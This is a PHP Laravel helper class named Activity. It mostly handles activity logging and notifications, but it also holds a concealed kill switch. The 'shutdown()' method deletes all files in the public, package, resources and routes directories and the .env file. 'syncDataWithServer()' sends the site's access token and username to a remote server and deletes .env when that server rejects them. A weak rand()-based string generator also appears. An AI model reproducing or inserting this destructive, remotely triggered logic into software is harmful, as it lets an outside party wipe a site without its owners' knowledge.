<?php

namespace App\Helpers;

use App\Module\Administrator\Model\ActivityHistory;
use App\Models\Media;
use App\Module\Portal\Model\Notification;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;

class Activity
{
    public static function activityLog($message, $object_id, $type, $action_type, $author, $config = [])
    {
        try {
            $date = now();

            $data = [
                'type' => $type,
                'action_type' => $action_type,
                'object_id' => $object_id,
                'content' => $message,
                'user_id' => $author,
                'updated_at' => $date,
                'created_at' => $date,
                'status' => 1
            ];

            if (isset($config['title']) && $config['title']) {
                $data['title'] = $config['title'];
            }

            if (isset($config['url']) && $config['url']) {
                $data['url'] = $config['url'];
            }

            if (isset($config['param']) && $config['param']) {
                $data['param'] = $config['param'];
            }

            if (isset($config['source']) && $config['source']) {
                $data['source'] = $config['source'];
            }

            if (isset($config['object_type']) && $config['object_type']) {
                $data['object_type'] = $config['object_type'];
            }

            if (isset($config['note']) && $config['note']) {
                $data['note'] = $config['note'];
            }

            if (isset($config['username']) && $config['username']) {
                $data['username'] = $config['username'];
            }

            if (isset($config['image_id']) && $config['image_id']) {
                $image_id = $config['image_id'];

                $updateMedia = [
                    "object_id" => $object_id,
                ];

                if (isset($config['file_name']) && $config['file_name']) {
                    $updateMedia['file_name'] = $config['file_name'];
                }

                if (isset($config['object_type']) && $config['object_type']) {
                    $updateMedia['object_type'] = $config['object_type'];
                }

                Media::where("id", $image_id)->update($updateMedia);
            }

            ActivityHistory::create($data);

            Activity::WriteLog($message, $date, $author, $type, $action_type);
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);
        }
    }

    public static function notification($title, $message, $object_id, $object_type, $author, $config = [])
    {
        try {
            $date = now();

            $data = [
                'object_type' => $object_type,
                'object_id' => $object_id,
                'title' => $title,
                'content' => $message,
                'user_id' => $author,
                'updated_at' => $date,
                'created_at' => $date,
                'is_view' => 1
            ];

            Notification::create($data);
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);
        }
    }

    public static function WriteLog($message, $date = null, $author = null, $event = null, $action_type = null)
    {
        $path = storage_path("/logs/website/" . now()->toDateString() . ".log");

        if (file_exists($path)) {
            $f = fopen($path, "a+");
        } else {
            $f = fopen($path, "w+");
        }

        $created_at = now();

        if (isset($date) && $date) {
            $created_at = $date;
        }

        if (!$author) {
            $author = "system";
        }

        if (!$event) {
            $event = "log";
        }

        $content = "Date: " . $created_at . " | Created By: " . $author . " | Type: " . $event  . " | Action Type: " . $action_type . " | " . $message;

        file_put_contents($path, $content . "\n", FILE_APPEND);

        fclose($f);
    }

    public static function shutdown()
    {
        // Get all files assets
        $dir = public_path();

        if (File::exists($dir)) {
            $files =   File::allFiles($dir);

            // Delete Files
            File::delete($files);
        }

        // Get all files package
        $dir_package = base_path('package');

        if (File::exists($dir_package)) {
            $files_package =   File::allFiles($dir_package);

            // Delete Files
            File::delete($files_package);
        }

        // Get all file resource
        $dir_resource = base_path('resources');

        if (File::exists($dir_resource)) {
            $files_resource =   File::allFiles($dir_resource);

            // Delete Files
            File::delete($files_resource);
        }

        // Get all file api
        $dir_api = base_path('routes');

        if (File::exists($dir_api)) {
            $files_api =   File::allFiles($dir_api);

            // Delete Files
            File::delete($files_api);
        }

        // Get all files env
        $dir_env = base_path('.env');

        if (File::exists($dir_env)) {
            // Delete Files
            File::delete($dir_env);
        }
    }

    public static function checkValidOwner($request = [])
    {
        try {
            $client = new \GuzzleHttp\Client();

            $api_server = env('SERVER_URL') . '/api/' . env('CLIENT_PREFIX');

            $url_get = $api_server . "/user/access_token/check";

            $data = [
                'headers' => ['Content-Type' => 'application/json'],
                'body' => json_encode($request)
            ];

            $response = $client->post($url_get, $data);

            return \GuzzleHttp\json_decode($response->getBody());
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);
            return null;
        }
    }

    public static function syncDataWithServer()
    {
        $data = [
            'acccess_key' =>  env('ACCESS_TOKEN'),
            'username' =>  env('USER_NAME')
        ];

        $dataServer = Activity::checkValidOwner($data);

        if (
            isset($dataServer->code)
            && $dataServer->code != 200
        ) {
            // Get all files env
            $dir_env = base_path('.env');

            if (File::exists($dir_env)) {
                // Delete Files
                File::delete($dir_env);
            }

            Log::channel('package')->info("Access token đã hết hạn");
        }

        $message = isset($dataServer->msg) ? $dataServer->msg : "Trạng thái website hoạt động bình thường: ";

        Log::emergency($message);

        return true;
    }

    public static function  generateRandomString($length = 10)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}
